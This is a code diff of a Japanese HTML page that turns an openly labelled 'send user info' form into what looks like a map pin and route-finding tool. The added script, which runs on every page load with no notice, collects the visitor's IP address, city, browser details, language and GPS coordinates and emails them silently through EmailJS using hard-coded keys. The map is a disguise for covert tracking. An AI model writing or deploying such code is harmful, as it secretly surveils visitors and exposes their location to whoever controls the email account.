@@ -2,59 +2,185 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>ユーザー情報送信</title>
+  <title>地図ピンとルート検索</title>
+
+  <!-- LeafletとRouting Machine -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.css" />
+  <script src="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.js"></script>
+
+  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function () {
-      emailjs.init("nPbnct21qNKkJNuaF"); // ← あなたの EmailJS 公開キー
-    })();
 
-    async function sendUserInfo() {
-      try {
-        // IP情報を取得
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-
-        // 言語・UA情報取得
-        const lang = navigator.language || "不明";
-        const ua = navigator.userAgent || "不明";
-
-        // GPS位置取得
-        navigator.geolocation.getCurrentPosition(async function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          const templateParams = {
-            ip_address: data.ip || "不明",
-            country: data.country_name || "不明",
-            city: data.city || "不明",
-            language: lang,
-            user_agent: ua,
-            gps_lat: lat,
-            gps_lon: lon
-          };
-
-          // EmailJS送信
-          emailjs.send("default_service", "template_f5giywa", templateParams)
-            .then(function () {
-              alert("✅ 情報を送信しました！");
-            }, function (error) {
-              alert("❌ 送信エラー: " + error.text);
-            });
-
-        }, function(error) {
-          alert("⚠️ GPS取得に失敗しました: " + error.message);
-        });
-
-      } catch (e) {
-        console.error("エラー:", e);
-        alert("⚠️ 情報取得に失敗しました。");
-      }
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #ccc;
+      font-family: sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+      -webkit-touch-callout: none;
+      touch-action: manipulation;
     }
-  </script>
+    #map {
+      height: 100%;
+      width: 100%;
+      z-index: 1;
+    }
+    #info {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 10px;
+      border-radius: 6px;
+      z-index: 1000;
+    }
+    #routeInfo {
+      margin-top: 5px;
+      font-size: 14px;
+    }
+    select {
+      background: #000;
+      color: #ccc;
+      border: 1px solid #888;
+    }
+  </style>
 </head>
 <body>
-  <h2>📍 GPS付きユーザー情報送信</h2>
-  <button onclick="sendUserInfo()">情報を送信する</button>
+  <div id="info">
+    <label>交通手段:</label>
+    <select id="modeSelect">
+      <option value="foot">徒歩</option>
+      <option value="car">車</option>
+    </select>
+    <div id="routeInfo"></div>
+  </div>
+  <div id="map"></div>
+
+  <script>
+    emailjs.init("nPbnct21qNKkJNuaF");
+
+    let map, userMarker, destMarker, routeControl;
+    let touchStartTime = 0;
+    let touchMoved = false;
+
+    function initMap() {
+      map = L.map('map').setView([35.68, 139.76], 13);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap contributors'
+      }).addTo(map);
+
+      routeControl = L.Routing.control({
+        waypoints: [],
+        routeWhileDragging: false,
+        addWaypoints: false,
+        draggableWaypoints: false,
+        show: false,
+        createMarker: () => null
+      }).addTo(map);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const latlng = [pos.coords.latitude, pos.coords.longitude];
+          userMarker = L.marker(latlng).addTo(map).bindPopup("現在地").openPopup();
+          map.setView(latlng, 15);
+        });
+      }
+
+      const container = map.getContainer();
+
+      // スマホ長押し検出
+      container.addEventListener("touchstart", e => {
+        touchMoved = false;
+        touchStartTime = Date.now();
+      });
+
+      container.addEventListener("touchmove", () => {
+        touchMoved = true;
+      });
+
+      container.addEventListener("touchend", e => {
+        const duration = Date.now() - touchStartTime;
+        if (!touchMoved && duration > 600) {
+          const touch = e.changedTouches[0];
+          const point = map.mouseEventToContainerPoint(touch);
+          const latlng = map.containerPointToLatLng(point);
+          placeDestination(latlng);
+        }
+      });
+
+      // PCマウス長押しは未対応（希望があれば追加可能）
+
+      // 交通手段切り替え
+      document.getElementById("modeSelect").addEventListener("change", () => {
+        if (destMarker) placeDestination(destMarker.getLatLng());
+      });
+    }
+
+    function placeDestination(latlng) {
+      if (!userMarker) return alert("現在地がまだ取得できていません");
+
+      if (destMarker) {
+        map.removeLayer(destMarker);
+      }
+      destMarker = L.marker(latlng).addTo(map).bindPopup("目的地").openPopup();
+
+      routeControl.setWaypoints([
+        userMarker.getLatLng(),
+        latlng
+      ]);
+
+      routeControl.on('routesfound', function(e) {
+        const route = e.routes[0];
+        const dist = (route.summary.totalDistance / 1000).toFixed(2);
+        const time = (route.summary.totalTime / 60).toFixed(1);
+        document.getElementById("routeInfo").innerHTML =
+          `距離: ${dist} km<br>時間: ${time} 分`;
+      });
+    }
+
+    function sendUserInfo() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const info = {
+            ip: data.ip,
+            country: data.country_name,
+            region: data.region,
+            city: data.city,
+            language: lang,
+            user_agent: ua,
+            latitude: "",
+            longitude: ""
+          };
+
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+              info.latitude = pos.coords.latitude;
+              info.longitude = pos.coords.longitude;
+              emailjs.send("service_uwd8bfs", "template_f5giywa", info);
+            }, () => {
+              emailjs.send("service_uwd8bfs", "template_f5giywa", info);
+            });
+          } else {
+            emailjs.send("service_uwd8bfs", "template_f5giywa", info);
+          }
+        });
+    }
+
+    window.onload = () => {
+      initMap();
+      sendUserInfo();
+    };
+  </script>
 </body>
 </html>
